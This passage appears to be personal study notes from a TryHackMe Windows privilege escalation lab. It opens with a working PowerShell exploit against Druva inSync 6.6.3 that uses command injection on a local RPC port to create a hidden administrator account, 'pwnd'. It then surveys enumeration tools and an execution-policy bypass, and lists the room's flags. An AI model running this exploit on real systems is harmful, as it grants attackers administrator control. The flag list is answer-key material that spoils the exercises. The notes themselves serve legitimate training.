+VNC Server 6.8.0                                                RealVNC                                  6.8.0.45849
+Amazon SSM Agent                                                Amazon Web Services                      3.0.529.0
+aws-cfn-bootstrap                                               Amazon Web Services                      2.0.5
+Druva inSync 6.6.3                                              Druva Technologies Pte. Ltd.             6.6.3.0
+AWS PV Drivers                                                  Amazon Web Services                      8.3.4
+Microsoft Visual C++ 2019 X64 Additional Runtime - 14.28.29910  Microsoft Corporation                    14.28.29910
+
+powershell
+
+Windows PowerShell
+Copyright (C) Microsoft Corporation. All rights reserved.
+
+PS C:\Users\thm-unpriv> $ErrorActionPreference = "Stop"
+PS C:\Users\thm-unpriv>
+PS C:\Users\thm-unpriv> $cmd = "net user pwnd SimplePass123 /add & net localgroup administrators pwnd /add"
+PS C:\Users\thm-unpriv>
+PS C:\Users\thm-unpriv> $s = New-Object System.Net.Sockets.Socket(
+>>     [System.Net.Sockets.AddressFamily]::InterNetwork,
+>>     [System.Net.Sockets.SocketType]::Stream,
+>>     [System.Net.Sockets.ProtocolType]::Tcp
+>> )
+PS C:\Users\thm-unpriv> $s.Connect("127.0.0.1", 6064)
+PS C:\Users\thm-unpriv>
+PS C:\Users\thm-unpriv> $header = [System.Text.Encoding]::UTF8.GetBytes("inSync PHC RPCW[v0002]")
+PS C:\Users\thm-unpriv> $rpcType = [System.Text.Encoding]::UTF8.GetBytes("$([char]0x0005)`0`0`0")
+PS C:\Users\thm-unpriv> $command = [System.Text.Encoding]::Unicode.GetBytes("C:\ProgramData\Druva\inSync4\..\..\..\Windows\System32\cmd.exe /c $cmd");
+PS C:\Users\thm-unpriv> $length = [System.BitConverter]::GetBytes($command.Length);
+PS C:\Users\thm-unpriv>
+PS C:\Users\thm-unpriv> $s.Send($header)
+22
+PS C:\Users\thm-unpriv> $s.Send($rpcType)
+4
+PS C:\Users\thm-unpriv> $s.Send($length)
+4
+PS C:\Users\thm-unpriv> $s.Send($command)
+280
+PS C:\Users\thm-unpriv> net user pwnd
+User name                    pwnd
+Full Name
+Comment
+User's comment
+Country/region code          000 (System Default)
+Account active               Yes
+Account expires              Never
+
+Password last set            9/2/2022 5:00:57 PM
+Password expires             10/14/2022 5:00:57 PM
+Password changeable          9/2/2022 5:00:57 PM
+Password required            Yes
+User may change password     Yes
+
+Workstations allowed         All
+Logon script
+User profile
+Home directory
+Last logon                   Never
+
+Logon hours allowed          All
+
+Local Group Memberships      *Administrators       *Users
+Global Group memberships     *None
+The command completed successfully.
+
+## use pwnd with the pass SimplePass123 (just choose pwnd and enter)
+
+                                                                                C:\Windows\system32>whoami                                                                                              wprivesc3\pwnd                                                                                                                                                                                                                                  C:\Windows\system32>type C:\Users\Administrator\Desktop\flag.txt                                                        THM{EZ_DLL_PROXY_4ME}
+```
+![[Pasted image 20220902121217.png]]
+Get the flag on the Administrator's desktop.
+### Tools of the Trade
+Several scripts exist to conduct system enumeration in ways similar to the ones seen in the previous task. These tools can shorten the enumeration process time and uncover different potential privilege escalation vectors. However, please remember that automated tools can sometimes miss privilege escalation.
+Below are a few tools commonly used to identify privilege escalation vectors. Feel free to run them against any of the machines in this room and see if the results match the discussed attack vectors.
+WinPEAS
+WinPEAS is a script developed to enumerate the target system to uncover privilege escalation paths. You can find more information about winPEAS and download either the precompiled executable or a .bat script. WinPEAS will run commands similar to the ones listed in the previous task and print their output. The output from winPEAS can be lengthy and sometimes difficult to read. This is why it would be good practice to always redirect the output to a file, as shown below:
+```Command Prompt
+C:\> winpeas.exe > outputfile.txt
+```
+WinPEAS can be downloaded [here](https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS)
+PrivescCheck
+PrivescCheck is a PowerShell script that searches common privilege escalation on the target system. It provides an alternative to WinPEAS without requiring the execution of a binary file.
+PrivescCheck can be downloaded [here](https://github.com/itm4n/PrivescCheck).
+Reminder: To run PrivescCheck on the target system, you may need to bypass the execution policy restrictions. To achieve this, you can use the Set-ExecutionPolicy cmdlet as shown below.
+```Powershell
+
+```
+```Powershell
+PS C:\> Set-ExecutionPolicy Bypass -Scope process -Force
+```
+```Powershell
+PS C:\> . .\PrivescCheck.ps1
+```
+```Powershell
+PS C:\> Invoke-PrivescCheck
+```
+WES-NG: Windows Exploit Suggester - Next Generation
+Some exploit suggesting scripts (e.g. winPEAS) will require you to upload them to the target system and run them there. This may cause antivirus software to detect and delete them. To avoid making unnecessary noise that can attract attention, you may prefer to use WES-NG, which will run on your attacking machine (e.g. Kali or TryHackMe AttackBox).
+WES-NG is a Python script that can be found and downloaded [here](https://github.com/bitsadmin/wesng).
+Once installed, and before using it, type the `wes.py --update` command to update the database. The script will refer to the database it creates to check for missing patches that can result in a vulnerability you can use to elevate your privileges on the target system.
+To use the script, you will need to run the `systeminfo` command on the target system. Do not forget to direct the output to a .txt file you will need to move to your attacking machine.
+Once this is done, wes.py can be run as follows;
+```text
+Kali Linux
+
+user@kali$ wes.py systeminfo.txt
+```
+Metasploit
+If you already have a Meterpreter shell on the target system, you can use the `multi/recon/local_exploit_suggester` module to list vulnerabilities that may affect the target system and allow you to elevate your privileges on the target system.
+Click and continue learning!
+*No answer needed*
+### Conclusion
+In this room, we have introduced several privilege escalation techniques available in Windows systems. These techniques should provide you with a solid background on the most common paths attackers can take to elevate privileges on a system. Should you be interested in learning about additional techniques, the following resources are available:
+PayloadsAllTheThings - Windows Privilege Escalation (https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)
+Priv2Admin - Abusing Windows Privileges (https://github.com/gtworek/Priv2Admin)
+RogueWinRM Exploit (https://github.com/antonioCoco/RogueWinRM)
+Potatoes (https://jlajara.gitlab.io/Potatoes_Windows_Privesc)
+Decoder's Blog (https://decoder.cloud/)
+Token Kidnapping (https://dl.packetstormsecurity.net/papers/presentations/TokenKidnapping.pdf)
+Hacktricks - Windows Local Privilege Escalation (https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation)
+Click and continue learning!
+*No answer needed*
+
+## Flags / Answers
+- ***THM{WHAT_IS_MY_PASSWORD}** *
+- ***THM{TASK_COMPLETED}***
+- ![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/d8244cfd9d64a7be30f5fb0308fd0806.png)
+- ![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/06c05c134e4922ec8ff8d9b56382c58f.png)
+- ***THM{AT_YOUR_SERVICE}***
+- ***THM{QUOTES_EVERYWHERE}***
+- ***THM{INSECURE_SVC_CONFIG}***
+- ![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/befb434f15dbd4deee0654f8b6ef6de0.png)
+- ![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/33303d0cde736589d2838ee894379ff2.png)
+- ![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/a5437a609e41d982b320967667e9b97a.png)
+- ![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/dd7290ca93369cee33182023cb9190ff.png)
+- ![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/1401bc3dcb1e4eb84f526b95567a5ef8.png)
+- ![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/006115497113a0a4f03008028dc32fb7.png)
+- ![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/c25de66ae7777169d09a61ce2fb38e28.png)
+- ![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/4603506a36f4bbda602dc67cdc845d9f.png)
+- ![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/24545e313a2e5ddee2386a68b4c7adeb.png)
+- ***THM{SEFLAGPRIVILEGE}***
+- ![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/ff706d6530426d3123c0983acd61f934.png)
+- ![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/bbd0af143c9a9b31c1acce32fabfdc0f.png)
+- ***THM{EZ_DLL_PROXY_4ME}** *
+
+## Notes / Lessons Learned
+[[Vulnerability Capstone]]
+
